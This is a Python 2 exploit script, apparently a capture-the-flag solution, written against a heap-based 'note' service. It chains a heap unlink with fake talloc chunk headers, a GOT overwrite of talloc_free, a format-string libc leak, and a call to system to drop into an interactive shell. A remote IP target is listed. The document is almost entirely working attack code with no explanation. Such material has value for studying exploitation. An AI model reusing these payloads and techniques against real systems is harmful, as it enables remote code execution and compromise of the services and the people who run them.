from threading import Thread
from zio import *

target = ('119.254.101.197', 10000)
target = './note'


def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

def add(io, title, size, content):
    io.read_until('>>')
    io.writeline('1')
    io.read_until(':')
    io.writeline(title)
    io.read_until(':')
    io.writeline(str(size))
    io.read_until(':')
    io.writeline(content)

def edit(io, id, offset, content):
    io.read_until('>>')
    io.writeline('3')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(str(offset))
    io.read_until(":")
    io.writeline(content)

def edit2(io, id, offset, content):
    count = len(content)/48
    print len(content)
    print count
    for i in range(count):
        io.read_until('>>')
        io.writeline('3')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until(':')
        io.writeline(str(offset+48*i))
        io.read_until(":")
        io.write(content[i*48:i*48+48])
    if len(content[count*48:]) > 0:
        io.read_until('>>')
        io.writeline('3')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until(':')
        io.writeline(str(offset+48*count))
        io.read_until(':')
        io.writeline(content[count*48:])

def delete(io, id):
    io.read_until('>>')
    io.writeline('4')
    io.read_until(':')
    io.writeline(str(id))

def change(io, id, title):
    io.read_until('>>')
    io.writeline('5')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(title)

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    add(io, '%13$p', 0x100, '111') #0x603070 0x603110   #0
    add(io, '222', 0x100, '222') #0x603280 0x603320   #1
    add(io, '333', 0x100, '333') #0x603490 0x603530   #2
    add(io, '444', 0x100, '444') #0x6036a0 0x603740   #3
    add(io, 'sh;', 0x100, '555') #0x6038b0 0x603950   #4
    add(io, '666', 0x100, '666') #0x603ac0 0x603b60   #5

    delete(io, 1)
    delete(io, 2)

    heap_ptr = 0x6020f0
    payload = l64(0) + l64(0x211) +l64(heap_ptr-0x18)+l64(heap_ptr-0x10)
    payload = payload[:-1]

    add(io, payload[:-1], 0x300, '777') #0x603280 0x603320   #6
    add(io, 'sh;', 0x100, '888')

    #io.gdb_hint()

    offset = 0x603490 - 0x603320
    #                      size        next    prev     parent
    fake_head1 = l64(0x210)+l64(0x90)+ l64(0) +l64(0)+ l64(0x603a60)
                # child   refs  descutor   name      size       flags                   pool   padding
    fake_head2 = l64(0)+l64(0)+l64(0)+l64(0x400dc4)+l64(0x100)+l64(0x00000000e8150c70)+l64(0)+l64(0)+l64(0)
    fake_head2 = fake_head2.ljust(0x90-0x28, '\x00')
    fake_head2 += l64(0) + l64(0x21) + '\x00'*0x10 + l64(0) + l64(0x21)

    fake_head1 = fake_head1[:-6]
    payload = '\x00' + l64(0)+l64(0xa1)+l64(0)+l64(0)+l64(0)+l64(0x6034a0)
    payload = payload[:-6]
    edit(io, 4, 0x100-1, payload)
    edit2(io, 6, offset, fake_head1)
    edit2(io, 6, offset+0x28, fake_head2)

    delete(io, 5)

    talloc_free_got = 0x602048
    print_plt = 0x4007E0

    title = l64(talloc_free_got) + l64(0) + l64(0) + l64(0x6020d0)
    title = title[:-2]
    change(io, 6, title)

    change(io, 3, l64(print_plt)[:-1])

    io.gdb_hint()
    delete(io, 0)

    io.read_until('0x')
    main_ret = int(io.read_until('De')[:-2], 16)
    base = main_ret - 0x0000000000021EC5
    print hex(base)
    system = base + 0x0000000000046640
    print hex(system)

    change(io, 3, l64(system)[:-1])

    delete(io, 7)

    interact(io)

exp(target)